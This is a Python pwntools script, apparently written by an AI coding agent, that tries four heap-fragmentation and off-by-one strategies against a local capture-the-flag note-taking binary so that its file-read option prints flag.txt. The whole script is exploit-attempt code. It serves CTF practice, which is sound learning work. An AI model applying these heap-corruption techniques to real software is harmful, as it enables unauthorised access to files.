#!/usr/bin/env python3
"""
Author: Claude Code
Purpose: Test heap metadata corruption with off-by-one
Created: 2025-11-16 00:45
Updated: 2025-11-16 00:45
Strategy: Try to corrupt heap chunk metadata to cause overlapping allocations
Expected: Find a way to control filepath content
Result: TBD
"""

from pwn import *
import os

def test_strategy(desc, ops_func):
    """Test a specific strategy"""
    print(f"\n[*] Testing: {desc}")

    binary_path = os.path.join(os.path.dirname(__file__), 'exp300-2-default')
    p = process(binary_path, level='error')

    try:
        p.recvuntil(b'Salutation', timeout=2)
        ops_func(p)

        # Try to cat
        p.sendlineafter(b'Pick one: ', b'4')
        result = p.recvall(timeout=1)

        if b'flag.txt' in result and b'not_the_flag' not in result:
            print(f"[+] SUCCESS: {result}")
            return True
        elif b'poctf{' in result.lower():
            print(f"[+][+] GOT FLAG: {result}")
            return True

    except Exception as e:
        pass
    finally:
        p.close()

    return False

# Strategy 1: Set filename, create note before that might land before it
def strat1(p):
    p.sendlineafter(b'Pick one: ', b'3')  # filename
    for size in [8, 16, 24]:
        p.sendlineafter(b'Pick one: ', b'1')
        p.sendlineafter(b'Size (bytes): ', str(size).encode())
        p.sendlineafter(b'Write: ', b'X' * size)

test_strategy("Filename then multiple notes", strat1)

# Strategy 2: Create notes, delete middle, set filename (fragmentation)
def strat2(p):
    # Create 3 notes
    for i in range(3):
        p.sendlineafter(b'Pick one: ', b'1')
        p.sendlineafter(b'Size (bytes): ', b'24')
        p.sendlineafter(b'Write: ', b'Y' * 24)
    # Delete middle
    p.sendlineafter(b'Pick one: ', b'2')
    p.sendlineafter(b'Note ID to delete: ', b'1')
    # Set filename - might go in the hole
    p.sendlineafter(b'Pick one: ', b'3')

test_strategy("Create-Delete-Filename fragmentation", strat2)

# Strategy 3: Notes with size 10 (might align differently)
def strat3(p):
    p.sendlineafter(b'Pick one: ', b'1')
    p.sendlineafter(b'Size (bytes): ', b'10')
    p.sendlineafter(b'Write: ', b'flag.txt\x00\x00')  # 10 bytes
    p.sendlineafter(b'Pick one: ', b'3')  # filename

test_strategy("Note size 10 with flag.txt", strat3)

# Strategy 4: Exact size match - 17 bytes like filepath
def strat4(p):
    p.sendlineafter(b'Pick one: ', b'1')
    p.sendlineafter(b'Size (bytes): ', b'17')
    # Write 17 chars, null goes at position 17
    p.sendlineafter(b'Write: ', b'flag.txt' + b'\x00' * 9)
    p.sendlineafter(b'Pick one: ', b'3')  # filename

test_strategy("Note size 17 matching filepath size", strat4)

print("\n[*] All strategies tested")
